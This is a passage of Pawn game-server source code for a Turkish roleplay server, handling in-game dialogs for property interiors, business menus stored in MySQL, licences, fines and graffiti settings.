					format(mstring, sizeof(mstring), "%s adresli iþyerinizi inþa ettirmeye baþladýnýz. süre:Hemen",GetLocation(Isyeri[q][girisX],Isyeri[q][girisY],Isyeri[q][girisZ]));
					Bilgi(playerid, mstring);
					/*for(new q=0;q<sizeof(Isyeri);q++)
					{
						if(IsyeriYetkilisi(playerid, q))
						{
						    format(mstring, sizeof(mstring), "%siþyeriID:%d\t Adres:%s\n",mstring, q, GetLocation(Isyeri[q][girisX],Isyeri[q][girisY],Isyeri[q][girisZ]));
						}
					}
					Ipucu(playerid, "Ýnterioru hangi eve inþa ettirmek istediðinizi seçin.");
					ShowPlayerDialog(playerid, 368, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Interior", mstring, "Seç", "");*/
			    }
			}
	    }
	    return 1;
	}
	if(dialogid == 368)
	{
	    if(response)
	    {
	        new _om = GetPVarInt(playerid, "OrnekMekan"),_omid= GetPVarInt(playerid, "IntAlID"),_say=-1;
	        switch(_om)
			{
				case 2:
			    {
                    foreach(new q : Houses)
					{
						if(Ev[q][esahip] == Karakter[playerid][sqlid] || Ev[q][kiralayan] == Karakter[playerid][sqlid] || Karakter[playerid][eanahtar][Ev[q][eid]] == 1)
						{
						    _say++;
						    if(listitem == _say)
							{
							    Ev[q][eintid] = _omid;
							    Ev[q][cikisX] = Interior[Ev[q][eintid]][intx];
						        Ev[q][cikisY] = Interior[Ev[q][eintid]][inty];
						        Ev[q][cikisZ] = Interior[Ev[q][eintid]][intz];
						        Ev[q][ecikisint] = Interior[Ev[q][eintid]][intint];
							    //Ev[q][eintsure] = floatround(floatround(Interior[_omid][intfiyat]/20000)*1440);
							    EvKaydet(q);
								new mstring[128];
								format(mstring, sizeof(mstring), "%s adresli evinizi inþa ettirmeye baþladýnýz. süre:Hemen",GetLocation(Ev[q][girisX],Ev[q][girisY],Ev[q][girisZ]));
								Bilgi(playerid, mstring);
								return 1;
							}
						}
					}
			    }
			    case 3:
			    {
			        foreach(new q : Business)
					{
						if(IsyeriYetkilisi(playerid, q))
						{
						    _say++;
						    if(listitem == _say)
							{
							    Isyeri[q][iintid] = _omid;
							    //Isyeri[q][iintsure] = floatround(floatround(Interior[_omid][intfiyat]/20000)*1440);
							    Isyeri[q][cikisX] = Interior[Isyeri[q][iintid]][intx];
				        		Isyeri[q][cikisY] = Interior[Isyeri[q][iintid]][inty];
				        		Isyeri[q][cikisZ] = Interior[Isyeri[q][iintid]][intz];
				        		Isyeri[q][icikisint] = Interior[Isyeri[q][iintid]][intint];
							    IsyeriKaydet(q);
								new mstring[128];
								format(mstring, sizeof(mstring), "%s adresli iþyerinizi inþa ettirmeye baþladýnýz. süre:Hemen",GetLocation(Isyeri[q][girisX],Isyeri[q][girisY],Isyeri[q][girisZ]));
								Bilgi(playerid, mstring);
								return 1;
							}
						}
					}
			    }
			}
	    }
		return 1;
	}
	if(dialogid == 369)
	{
	    if(response)
		{
		    new mesafe = IsyeriMesafesi(2.0, playerid);
		    if(!IsyeriYetkilisi(playerid, mesafe)) return 1;
		    new _stok = strval(inputtext);
		    if(_stok < 0 || _stok > 10000) return Hata(playerid, "Tek seferde en fazla 10.000 stok alabilirsiniz.");
		    if(GetPlayerCash(playerid) < _stok*10) return Hata(playerid, "Üzerinizde yeterli miktarda para yok.");
		    GivePlayerCash(playerid, -_stok*10);
		    Isyeri[mesafe][istok] += _stok;
		    new mstring[128];
		    format(mstring, sizeof(mstring), "Mevcut toplam iþyeri stok sayýnýz: #000%d", Isyeri[mesafe][istok]);
			Bilgi(playerid, mstring);
			IsyeriKaydet(mesafe);
		}
		return 1;
	}
	if(dialogid == 370)
	{
	    if(response)
	    {
	        new mesafe = GetPVarInt(playerid, "MenuIsyeriID");
	        new midx;
	        new listitemx = GetPVarInt(playerid, "MenuDuzenleID");
	        new mstring[248],query[128],rows,fields,_ttip[12],__ad[32],__tip;
			format(query, sizeof(query), "SELECT * FROM `isyerimenu` WHERE `id` = '%d'",mesafe);
			new Cache:cache = mysql_query(query,true);
            cache_get_data(rows, fields, g_iHandle);
           	cache_get_field_content(listitemx, "isim", __ad);
           	midx = cache_get_field_content_int(listitemx, "mid");
            if(cache_get_field_content_int(listitemx, "tip") == 1) { __tip = 1; _ttip = "Yiyecek"; }
            else if(cache_get_field_content_int(listitemx, "tip") == 2) { __tip = 2; _ttip = "Ýçecek"; }
			format(mstring, sizeof(mstring), "Tip\t\t "C2"%s\nÝsim\t\t "C2"%s\nFiyat\t\t "C2"%d\nModel\t\t "C2"%d\n"C2"Menü Sil",
				_ttip,
				__ad,
				cache_get_field_content_int(listitemx, "fiyat"),
                cache_get_field_content_int(listitemx, "model"));
            cache_delete(cache);
            SetPVarInt(playerid, "MenuIsyeriMID", midx);
			if(listitem == 0)
			{
			    switch(__tip)
				{
				    case 1: format(query, sizeof(query), "UPDATE `isyerimenu` SET `tip` = '2' WHERE `mid` = '%d'",midx),strreplace(mstring,"Yiyecek","Ýçecek");
				    case 2: format(query, sizeof(query), "UPDATE `isyerimenu` SET `tip` = '1' WHERE `mid` = '%d'",midx),strreplace(mstring,"Ýçecek","Yiyecek");
				}
				mysql_tquery(1,query);
				IsyeriKaydet(mesafe);
			}
			if(listitem == 1)
			{
			    return ShowPlayerDialog(playerid, 371, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Menü Adý Deðiþtir", "Menünüze isim girin:", "Deðiþtir", "Ýptal");
			}
			if(listitem == 2)
			{
			    return ShowPlayerDialog(playerid, 372, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Menü Fiyatý Deðiþtir", "Menünüze fiyat girin:", "Deðiþtir", "Ýptal");
			}
			if(listitem == 3)
			{
			    if(__tip == 1)
				{
				    new _modell[5];
				    _modell[0] = 2703;
				    _modell[1] = 2768;
				    _modell[2] = 19811;
				    _modell[3] = 2769;
				    _modell[4] = 19580;
				    ShowModelSelectionMenuEx(playerid, _modell, 5, ""C7"EIGHTBORN - "C8"Menü Model", MENU_MODEL2, 16.0, 0.0, -55.0);
				    return 1;
				}
				else
				{
				    new _modell[5];
					_modell[0] = 19835;
					_modell[1] = 2647;
					_modell[2] = 19570;
					_modell[3] = 19563;
					_modell[4] = 19564;
					ShowModelSelectionMenuEx(playerid, _modell, 5, ""C7"EIGHTBORN - "C8"Menü Model", MENU_MODEL2, 16.0, 0.0, -55.0);
					return 1;
				}
			}
			if(listitem == 4)
			{
				format(query, sizeof(query), "DELETE FROM `isyerimenu` WHERE `mid` = '%d'",midx);
				mysql_tquery(1,query);
				Bilgi(playerid, "Menüyü iþyerinizden kaldýrdýnýz.");
			    return 1;
			}
			ShowPlayerDialog(playerid, 370, DIALOG_STYLE_TABLIST, ""C7"EIGHTBORN - "C8"Ýþyeri Menüsü", mstring, "Düzenle", "Geri");
	    }
		else
		{
		    new mesafe = GetPVarInt(playerid, "MenuIsyeriID");
		    new mstring[248],query[128],rows,fields,_ttip[12],__ad[32];
			format(query, sizeof(query), "SELECT * FROM `isyerimenu` WHERE `id` = '%d'",mesafe);
			new Cache:cache = mysql_query(query,true);
            cache_get_data(rows, fields, g_iHandle);
            for (new i = 0; i < rows; i ++)
            {
            	cache_get_field_content(i, "isim", __ad);
                if(cache_get_field_content_int(i, "tip") == 1) _ttip = "Yiyecek";
                else if(cache_get_field_content_int(i, "tip") == 2) _ttip = "Ýçecek";
				format(mstring, sizeof(mstring), "%s\n%s\t%s\t%d\t%d",
					mstring,
					_ttip,
					__ad,
					cache_get_field_content_int(i, "fiyat"),
                    cache_get_field_content_int(i, "model"));
			}
			cache_delete(cache);
			format(mstring, sizeof(mstring), "Yiyecek/Ýçecek\tÝsim\tFiyat\tModel\n%s\n"C2"Menü Ekle",mstring);
			ShowPlayerDialog(playerid, 347, DIALOG_STYLE_TABLIST_HEADERS, ""C7"EIGHTBORN - "C8"Ýþyeri Menüsü", mstring, "Tamam", "Ýptal");
			SetPVarInt(playerid, "MenuIsyeriID", mesafe);
		}
	    return 1;
	}
	if(dialogid == 371)
	{
	    if(response)
	    {
	        if(strlen(inputtext) > 32) return Hata(playerid, "Menü ismi bu kadar uzun olamaz.");
	        new mesafe = GetPVarInt(playerid, "MenuIsyeriID");
	        new midx = GetPVarInt(playerid, "MenuIsyeriMID");
	        new listitemx = GetPVarInt(playerid, "MenuDuzenleID");
	        new mstring[248],query[128],rows,fields,_ttip[12],__ad[32];
			format(query, sizeof(query), "UPDATE `isyerimenu` SET `isim` = '%s' WHERE `mid` = '%d'",EscapeString(inputtext),midx);
			mysql_tquery(1,query);
			format(query, sizeof(query), "SELECT * FROM `isyerimenu` WHERE `id` = '%d'",mesafe);
			new Cache:cache = mysql_query(query,true);
            cache_get_data(rows, fields, g_iHandle);
           	cache_get_field_content(listitemx, "isim", __ad);
            if(cache_get_field_content_int(listitemx, "tip") == 1) _ttip = "Yiyecek";
            else if(cache_get_field_content_int(listitemx, "tip") == 2) _ttip = "Ýçecek";
			format(mstring, sizeof(mstring), "Tip\t\t "C2"%s\nÝsim\t\t "C2"%s\nFiyat\t\t "C2"%d\nModel\t\t "C2"%d\n"C2"Menü Sil",
				_ttip,
				inputtext,
				cache_get_field_content_int(listitemx, "fiyat"),
                cache_get_field_content_int(listitemx, "model"));
            cache_delete(cache);
            ShowPlayerDialog(playerid, 370, DIALOG_STYLE_TABLIST, ""C7"EIGHTBORN - "C8"Ýþyeri Menüsü", mstring, "Düzenle", "Geri");
            IsyeriKaydet(mesafe);
	    }
		return 1;
	}
	if(dialogid == 372)
	{
	    if(response)
	    {
	        if(strval(inputtext) < 0 || strval(inputtext) > 5000) return Hata(playerid, "Hatalý menü fiyatý girdiniz.");
	        new mesafe = GetPVarInt(playerid, "MenuIsyeriID");
	        new midx = GetPVarInt(playerid, "MenuIsyeriMID");
	        new listitemx = GetPVarInt(playerid, "MenuDuzenleID");
	        new mstring[248],query[128],rows,fields,_ttip[12],__ad[32];
			format(query, sizeof(query), "UPDATE `isyerimenu` SET `fiyat` = '%d' WHERE `mid` = '%d'",strval(inputtext),midx);
			mysql_tquery(1,query);
			format(query, sizeof(query), "SELECT * FROM `isyerimenu` WHERE `id` = '%d'",mesafe);
			new Cache:cache = mysql_query(query,true);
            cache_get_data(rows, fields, g_iHandle);
           	cache_get_field_content(listitemx, "isim", __ad);
            if(cache_get_field_content_int(listitemx, "tip") == 1) _ttip = "Yiyecek";
            else if(cache_get_field_content_int(listitemx, "tip") == 2) _ttip = "Ýçecek";
			format(mstring, sizeof(mstring), "Tip\t\t "C2"%s\nÝsim\t\t "C2"%s\nFiyat\t\t "C2"%d\nModel\t\t "C2"%d\n"C2"Menü Sil",
				_ttip,
				__ad,
				strval(inputtext),
                cache_get_field_content_int(listitemx, "model"));
            cache_delete(cache);
            ShowPlayerDialog(playerid, 370, DIALOG_STYLE_TABLIST, ""C7"EIGHTBORN - "C8"Ýþyeri Menüsü", mstring, "Düzenle", "Geri");
            IsyeriKaydet(mesafe);
	    }
	    return 1;
	}
	if(dialogid == 373)
	{
	    if(response)
	    {
	        if(strlen(inputtext) == 0) return Hata(playerid, "Hatalý kod girdiniz.");
	        new _random[7];
	        GetPVarString(playerid, "BalikRandom", _random, 7);
	        if(Buysa(_random,inputtext)) ShowPlayerDialog(playerid, 150, DIALOG_STYLE_LIST, "Balýkçý: Hoþgeldin.","Balýk satmak istiyorum.\nYem almak istiyorum.\nOlta almak istiyorum.\t [$75]","Evet","Kapat");
	        else return Hata(playerid, "Hatalý kod girdiniz.");
	    }
	    return 1;
	}
	if(dialogid == 374)
	{
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0:
				{
				    if(Karakter[playerid][saglikrapor]) return Hata(playerid, "Zaten saðlýk raporunuz bulunmaktadýr.");
				    if(GetPlayerCash(playerid) < 150) return Hata(playerid, "Üzerinizde yeterli miktarda para bulunmamaktadýr.");
					GivePlayerCash(playerid, -150);
					Karakter[playerid][saglikrapor] = 1;
					Bilgi(playerid, "Saðlýk raporu aldýnýz.");
				}
				case 1:
				{
				    return cmd_tedaviol(playerid);
				}
	        }
	    }
		return 1;
	}
	if(dialogid == 375)
	{
	    if(response)
	    {
	        new _pid = GetPVarInt(playerid, "UyariDuzenle");
            new query[128],mxstring[2048];
    		format(query, sizeof(query), "SELECT * FROM `uyarilar` WHERE `ad` = '%s'",OyuncuAdiniBul(_pid));
		    new rows, fields, _tarih[512], _sebep[128], _yonetici[32];
			new Cache:cache = mysql_query(query,true);
			cache_get_data(rows, fields, g_iHandle);
			cache_get_field_content(listitem, "tarih", _tarih);
			cache_get_field_content(listitem, "sebep", _sebep);
			cache_get_field_content(listitem, "yonetici", _yonetici);
			SetPVarInt(playerid, "UyariDuzenleID", cache_get_field_content_int(listitem, "id"));
			cache_delete(cache);
			format(mxstring, sizeof(mxstring), ""C1"Uyaran Yönetici:\t "C2"%s\n"C1"Tarih:\t\t\t "C2"%s\n"C1"Sebep:\t\t\t "C2"%s\n\n"C1"Kiþinin uyarý sayýsý "C2"%d"C1", uyarýyý silmek istiyor musunuz:", _yonetici, _tarih, _sebep, Karakter[_pid][uyari]);
			ShowPlayerDialog(playerid, 376, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Uyarý Düzenle", mxstring, "Evet", "Hayýr");
		}
	    return 1;
	}
	if(dialogid == 376)
	{
	    if(response)
	    {
	        new query[128];
	        format(query,sizeof(query), "DELETE FROM `uyarilar` WHERE `id` = '%d'",GetPVarInt(playerid, "UyariDuzenleID"));
	        mysql_tquery(1,query);
	        Karakter[GetPVarInt(playerid, "UyariDuzenle")][uyari]--;
			Bilgi(playerid, "Oyuncunun uyarýsýný sildiniz.");
	    }
	    return 1;
	}
	if(dialogid == 377)
	{
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0:
				{
				    if(Karakter[playerid][temizrapor] == -1) return Hata(playerid, "Sabýka kaydýnýz olduðu için temiz raporu alamazsýnýz.");
				    if(Karakter[playerid][temizrapor] == 1) return Hata(playerid, "Zaten temiz raporunuz bulunmaktadýr.");
				    if(Karakter[playerid][ceza] > 0) return Hata(playerid, "Üzerinizde ceza varken temiz raporu alamazsýnýz.");
				    if(GetPlayerCash(playerid) < 150) return Hata(playerid, "Üzerinizde yeterli miktarda para bulunmamaktadýr.");
					GivePlayerCash(playerid, -150);
					Karakter[playerid][temizrapor] = 1;
					Bilgi(playerid, "Temiz raporu aldýnýz.");
				}
				case 1:
				{
				    //ShowPlayerDialog(playerid, 378, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - Ceza Öde", ""C1"Cezasýný ödemek istediðiniz aracýn idsini girin:", "Ceza Öde", "Ýptal");
					ShowPlayerDialog(playerid, 379, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Ceza Öde", ""C1"Ne cezasý ödemek istiyorsunuz:", "Þahsi", "Araç");
				}
				/*case 2:
				{
				    if(Karakter[playerid][ehliyet]) return Hata(playerid, "Zaten ehliyetiniz bulunmaktadýr.");
				    if(!Karakter[playerid][temizrapor]) return Hata(playerid, "Temiz raporunuz bulunmamaktadýr.");
				    if(!Karakter[playerid][saglikrapor]) return Hata(playerid, "Saðlýk raporunuz bulunmamaktadýr.");
				    if(!Karakter[playerid][surucusinav]) return Hata(playerid, "Direksiyon sýnavýný geçmemiþsiniz.");
				    if(GetPlayerCash(playerid) < 200) return Hata(playerid, "Üzerinizde yeterli miktarda para bulunmamaktadýr.");
				    GivePlayerCash(playerid, -200);
				    Karakter[playerid][ehliyet] = 1;
					Bilgi(playerid, "Ehliyet aldýnýz.");
				}*/
				case 2:
				{
				    ShowPlayerDialog(playerid, 456, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Kefalet Öde", ""C1"Kefaletini ödemek istediðiniz kiþinin adýný girin.\n(Örnek: Meta_Test)", "Kefalet Öde", "Ýptal");
				}
				case 3: {
				    if(Karakter[playerid][denizlisans]) return Hata(playerid, "Zaten deniz lisansýnýz bulunuyor.");
					if(GetPlayerCash(playerid) < 450000) return Hata(playerid, "Yeterli miktarda paranýz bulunmamaktadýr. [450.000$]");
					Bilgi(playerid, "Deniz lisansý aldýnýz.");
					GivePlayerCash(playerid, -450000);
					Karakter[playerid][denizlisans] = 1;
					KarakterKaydet(playerid);
					Ipucu(playerid, "'/dlisansgoster' komutu ile deniz lisansýnýzý gösterebilirsiniz.");
				}
				case 4: {
					if(Karakter[playerid][havalisans]) return Hata(playerid, "Zaten hava lisansýnýz bulunuyor.");
					if(GetPlayerCash(playerid) < 650000) return Hata(playerid, "Yeterli miktarda paranýz bulunmamaktadýr. [650.000$]");
					Bilgi(playerid, "Hava lisansý aldýnýz.");
					GivePlayerCash(playerid, -650000);
					Karakter[playerid][havalisans] = 1;
					KarakterKaydet(playerid);
					Ipucu(playerid, "'/hlisansgoster' komutu ile hava lisansýnýzý gösterebilirsiniz.");
				}
	        }
	    }
		return 1;
	}
	if(dialogid == 669)
	{
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0:
				{
				    if(!Karakter[playerid][temizrapor]) return Hata(playerid, "Temiz raporunuz bulunmamaktadýr.");
				    if(Karakter[playerid][sruhsat]) return Hata(playerid, "Zaten silah bulundurma ruhsatýnýz bulunmaktadýr.");
				    if(Karakter[playerid][ceza] > 0) return Hata(playerid, "Üzerinizde ceza varken silah ruhsatý alamazsýnýz.");
				    if(GetPlayerCash(playerid) < 75000) return Hata(playerid, "Üzerinizde yeterli miktarda para bulunmamaktadýr.");
					GivePlayerCash(playerid, -75000);
					Karakter[playerid][sruhsat] = 1;
					Bilgi(playerid, "Silah bulundurma ruhsatý aldýnýz.");
				}
				case 1:
				{
				    if(Karakter[playerid][sruhsat2]) return Hata(playerid, "Zaten silah taþýma ruhsatýnýz bulunmaktadýr.");
				    if(!Karakter[playerid][sruhsat]) return Hata(playerid, "Silah taþýma ruhsatý almak için öncelikle silah bulundurma ruhsatý almalýsýnýz.");
				    if(!Karakter[playerid][temizrapor]) return Hata(playerid, "Temiz raporunuz bulunmamaktadýr.");
				    if(GetPlayerCash(playerid) < 75000) return Hata(playerid, "Üzerinizde yeterli miktarda para bulunmamaktadýr.");
				    GivePlayerCash(playerid, -75000);
				    Karakter[playerid][sruhsat2] = 1;
					Bilgi(playerid, "Silah taþýma ruhsatý aldýnýz.");
				}
	        }
	    }
		return 1;
	}
	if(dialogid == 378)
	{
	    if(response)
		{
		    new mstring[64],_say=-1;
		    for(new i;i<MAX_VEHICLES;i++)
			{
				if(VergiOdeArac(playerid,i) && cezali[i] > 0)
				{
				    _say++;
				    if(_say == listitem)
				    {
				        format(mstring, sizeof(mstring), "/arac cezaode %d", i);
		   			 	OnPlayerCommandPerformed(playerid, mstring, 0);
				        return 1;
				    }
				}
			}
	    }
	    return 1;
	}
	if(dialogid == 379)
	{
	    if(response) OnPlayerCommandPerformed(playerid, "/cezaode", 0);
		else {
            new mstring[2048];
   			for(new i;i<MAX_VEHICLES;i++)
			{
				if(VergiOdeArac(playerid,i) && cezali[i] > 0)
				{
				    format(mstring, sizeof(mstring), "%s%d\t%s\t%s\t%d\n",mstring,i,GetVehicleName(i),Arac[i][aplaka],cezali[i]);
				}
			}
			format(mstring, sizeof(mstring), "ID\tModel\tPlaka\tCeza\n%s",mstring);
			ShowPlayerDialog(playerid, 378, DIALOG_STYLE_TABLIST_HEADERS, ""C7"EIGHTBORN - "C8"Banka", mstring, "Ceza Öde", "Ýptal");
		}
		return 1;
	}
	if(dialogid == 381)
	{
	    if(response)
	    {
	        new mesafe = IsyeriMesafesi(5.0, playerid);
	        new _say=-1,mstring[128];
	        for(new i=0;i<MAX_VEHICLES;i++)
	        {
				if(Arac[i][aisyeri] == mesafe)
				{
				    _say++;
				    if(_say == listitem)
				    {
				        if(Isyeri[mesafe][itip] == 16 && IsLoadableVehicle(i)) {
					        if(Arac[i][atip] == 10)
					        {
					            Arac[i][atip] = 1;
					            format(mstring, sizeof(mstring), "%d idli aracý sevkiyat aracý olmaktan çýkardýnýz.",i);
					            Bilgi(playerid,mstring);
					        }
					        else
					        {
					            Arac[i][atip] = 10;
	                            format(mstring, sizeof(mstring), "%d idli aracý sevkiyat aracý yaptýnýz.",i);
					            Bilgi(playerid,mstring);
					        }
				        	AracKaydet(i);
						}
						else if(Isyeri[mesafe][itip] == 22 && GetVehicleModel(i) == 455) {
					        if(Arac[i][atip] == 14)
					        {
					            Arac[i][atip] = 1;
					            format(mstring, sizeof(mstring), "%d idli aracý hafriyat aracý olmaktan çýkardýnýz.",i);
					            Bilgi(playerid,mstring);
					        }
					        else
					        {
					            Arac[i][atip] = 14;
	                            format(mstring, sizeof(mstring), "%d idli aracý hafriyat aracý yaptýnýz.",i);
					            Bilgi(playerid,mstring);
					        }
				        	AracKaydet(i);
						}
				    }
				}
	        }
	    }
	    return 1;
	}
	if(dialogid == DIALOG_GRAFFITI+1)
	{
	    if(response)
	    {
			if(strlen(inputtext) > 80) return Hata(playerid, "Maksimum karakter sayýsýný geçtiniz.");
	 		SetPVarString(playerid, "Yazi", inputtext);
	 		new mstring[128];
  			format(mstring, sizeof(mstring), "Graffiti yazýnýz %s olarak ayarlandý.", inputtext);
  			Bilgi(playerid, mstring);
  			ShowPlayerDialog(playerid, DIALOG_GRAFFITI, DIALOG_STYLE_TABLIST, ""C7"EIGHTBORN - "C8"Graffiti", ""NOKTA" Graffiti\t "C2"Yazý\n"NOKTA" Graffiti\t "C2"Büyüklük\n"NOKTA" Graffiti\t "C2"Yazý Tipi\n"NOKTA" Graffiti\t "C2"Yazý Büyüklük\n"NOKTA" Graffiti\t "C2"Kalýnlýk\n"NOKTA" Graffiti\t "C2"Ortala\n"NOKTA" Graffiti\t "C2"Renk\n"NOKTA" Graffiti\t "C2"Konum Belirle\n"NOKTA" Graffiti\t "C2"Sil\n"NOKTA" Graffiti\t "C2"Kaydet(Tamamla)", "Tamam", "Iptal");
		}
		return 1;
	}
	if(dialogid == DIALOG_GRAFFITI+2)
	{
		if(response)
		{
		    if(strval(inputtext) < 0 || strval(inputtext) > 13) return Hata(playerid, "Yanlýþ alan büyüklüðü girdiniz.");
		    new x = strval(inputtext);
		    new mstring[128];
			if(x == 0)
			{
			    SetPVarInt(playerid, "Buyukluk", 10);
                format(mstring, sizeof(mstring), "Graffiti büyüklüðünüz 32x32 olarak ayarlandý.");
			}
			else if(x == 1)
			{
			    SetPVarInt(playerid, "Buyukluk", 20);
			    format(mstring, sizeof(mstring), "Graffiti büyüklüðünüz 64x32 olarak ayarlandý.");
			}
			else if(x == 2)
			{
			    SetPVarInt(playerid, "Buyukluk", 30);
			    format(mstring, sizeof(mstring), "Graffiti büyüklüðünüz 64x64 olarak ayarlandý.");
			}
			else if(x == 3)
			{
			    SetPVarInt(playerid, "Buyukluk", 40);
			    format(mstring, sizeof(mstring), "Graffiti büyüklüðünüz 128x32 olarak ayarlandý.");
			}
			else if(x == 4)
			{
			    SetPVarInt(playerid, "Buyukluk", 50);
			    format(mstring, sizeof(mstring), "Graffiti büyüklüðünüz 128x64 olarak ayarlandý.");
			}
			else if(x == 5)
			{
			    SetPVarInt(playerid, "Buyukluk", 60);
			    format(mstring, sizeof(mstring), "Graffiti büyüklüðünüz 128x128 olarak ayarlandý.");
			}
			else if(x == 6)
			{
			    SetPVarInt(playerid, "Buyukluk", 70);
			    format(mstring, sizeof(mstring), "Graffiti büyüklüðünüz 256x32 olarak ayarlandý.");
			}
			else if(x == 7)
			{
			    SetPVarInt(playerid, "Buyukluk", 80);
			    format(mstring, sizeof(mstring), "Graffiti büyüklüðünüz 256x64 olarak ayarlandý.");
			}
			else if(x == 8)
			{
			    SetPVarInt(playerid, "Buyukluk", 90);
			    format(mstring, sizeof(mstring), "Graffiti büyüklüðünüz 256x128 olarak ayarlandý.");
			}
			else if(x == 9)
			{
			    SetPVarInt(playerid, "Buyukluk", 100);
			    format(mstring, sizeof(mstring), "Graffiti büyüklüðünüz 256x256 olarak ayarlandý.");
			}
			else if(x == 10)
			{
			    SetPVarInt(playerid, "Buyukluk", 110);
			    format(mstring, sizeof(mstring), "Graffiti büyüklüðünüz 512x64 olarak ayarlandý.");
			}
			else if(x == 11)
			{
			    SetPVarInt(playerid, "Buyukluk", 120);
			    format(mstring, sizeof(mstring), "Graffiti büyüklüðünüz 512x128 olarak ayarlandý.");
			}
			else if(x == 12)
			{
			    SetPVarInt(playerid, "Buyukluk", 130);
			    format(mstring, sizeof(mstring), "Graffiti büyüklüðünüz 512x256 olarak ayarlandý.");
			}
			else if(x == 13)
			{
			    SetPVarInt(playerid, "Buyukluk", 140);
			    format(mstring, sizeof(mstring), "Graffiti büyüklüðünüz 512x512 olarak ayarlandý.");
			}
	        Bilgi(playerid, mstring);
	        ShowPlayerDialog(playerid, DIALOG_GRAFFITI, DIALOG_STYLE_TABLIST, ""C7"EIGHTBORN - "C8"Graffiti", ""NOKTA" Graffiti\t "C2"Yazý\n"NOKTA" Graffiti\t "C2"Büyüklük\n"NOKTA" Graffiti\t "C2"Yazý Tipi\n"NOKTA" Graffiti\t "C2"Yazý Büyüklük\n"NOKTA" Graffiti\t "C2"Kalýnlýk\n"NOKTA" Graffiti\t "C2"Ortala\n"NOKTA" Graffiti\t "C2"Renk\n"NOKTA" Graffiti\t "C2"Konum Belirle\n"NOKTA" Graffiti\t "C2"Sil\n"NOKTA" Graffiti\t "C2"Kaydet(Tamamla)", "Tamam", "Iptal");
		}
		return 1;
	}
	if(dialogid == DIALOG_GRAFFITI+3)
	{
	    if(response)
	    {
	        if(strlen(inputtext))
	        {
	            new mstring[128];
                SetPVarString(playerid, "YaziTipi", inputtext);
                format(mstring, sizeof(mstring), "Graffiti yazý tipiniz %s olarak ayarlandý.", inputtext);
                Bilgi(playerid, mstring);
                ShowPlayerDialog(playerid, DIALOG_GRAFFITI, DIALOG_STYLE_TABLIST, ""C7"EIGHTBORN - "C8"Graffiti", ""NOKTA" Graffiti\t "C2"Yazý\n"NOKTA" Graffiti\t "C2"Büyüklük\n"NOKTA" Graffiti\t "C2"Yazý Tipi\n"NOKTA" Graffiti\t "C2"Yazý Büyüklük\n"NOKTA" Graffiti\t "C2"Kalýnlýk\n"NOKTA" Graffiti\t "C2"Ortala\n"NOKTA" Graffiti\t "C2"Renk\n"NOKTA" Graffiti\t "C2"Konum Belirle\n"NOKTA" Graffiti\t "C2"Sil\n"NOKTA" Graffiti\t "C2"Kaydet(Tamamla)", "Tamam", "Iptal");
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_GRAFFITI+4)
	{
	    if(response)
	    {
	        if(strval(inputtext))
	        {
	        	new mstring[128];
	            if(strval(inputtext) < 1 || strval(inputtext) > 255) return Hata(playerid, "Maksimum yazý büyüklüðünü geçtiniz.");
				new x = strval(inputtext);
				SetPVarInt(playerid, "YaziBoyutu", x);
                format(mstring, sizeof(mstring), "Graffiti yazý büyüklüðünüz %i olarak ayarlandý.", x);
                Bilgi(playerid, mstring);
                ShowPlayerDialog(playerid, DIALOG_GRAFFITI, DIALOG_STYLE_TABLIST, ""C7"EIGHTBORN - "C8"Graffiti", ""NOKTA" Graffiti\t "C2"Yazý\n"NOKTA" Graffiti\t "C2"Büyüklük\n"NOKTA" Graffiti\t "C2"Yazý Tipi\n"NOKTA" Graffiti\t "C2"Yazý Büyüklük\n"NOKTA" Graffiti\t "C2"Kalýnlýk\n"NOKTA" Graffiti\t "C2"Ortala\n"NOKTA" Graffiti\t "C2"Renk\n"NOKTA" Graffiti\t "C2"Konum Belirle\n"NOKTA" Graffiti\t "C2"Sil\n"NOKTA" Graffiti\t "C2"Kaydet(Tamamla)", "Tamam", "Iptal");
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_GRAFFITI+5)
	{
	    if(response)
	    {
	        new mstring[128];
	        if(strval(inputtext) < 0 || strval(inputtext) > 1) return Hata(playerid, "Hatalý kalýnlýk.");
			new x = strval(inputtext);
			SetPVarInt(playerid, "Kalinlik", x);
			if(x == 0)
			{
               	format(mstring, sizeof(mstring), "Graffiti kalýnlýðý standart olarak ayarlandý.");
			}
			else if(x == 1)
			{
               	format(mstring, sizeof(mstring), "Graffiti kalýnlýðý kalýn olarak ayarlandý.");
			}
            Bilgi(playerid, mstring);
    		ShowPlayerDialog(playerid, DIALOG_GRAFFITI, DIALOG_STYLE_TABLIST, ""C7"EIGHTBORN - "C8"Graffiti", ""NOKTA" Graffiti\t "C2"Yazý\n"NOKTA" Graffiti\t "C2"Büyüklük\n"NOKTA" Graffiti\t "C2"Yazý Tipi\n"NOKTA" Graffiti\t "C2"Yazý Büyüklük\n"NOKTA" Graffiti\t "C2"Kalýnlýk\n"NOKTA" Graffiti\t "C2"Ortala\n"NOKTA" Graffiti\t "C2"Renk\n"NOKTA" Graffiti\t "C2"Konum Belirle\n"NOKTA" Graffiti\t "C2"Sil\n"NOKTA" Graffiti\t "C2"Kaydet(Tamamla)", "Tamam", "Iptal");
		}
		return 1;
	}
	if(dialogid == DIALOG_GRAFFITI+6)
	{
	    if(response)
	    {
     		new mstring[128];
	        if(strval(inputtext) < 0 || strval(inputtext) > 2) return Hata(playerid, "Hatalý ortalama.");
			new x = strval(inputtext);
			SetPVarInt(playerid, "Ortalama", x);
			if(x == 0)
			{
               	format(mstring, sizeof(mstring), "Graffiti yazý solda olarak ayarlandý.");
			}
			else if(x == 1)
			{
               	format(mstring, sizeof(mstring), "Graffiti yazý ortada olarak ayarlandý.");
			}
			else if(x == 2)
			{
               	format(mstring, sizeof(mstring), "Graffiti yazý saðda olarak ayarlandý.");
			}
            Bilgi(playerid, mstring);
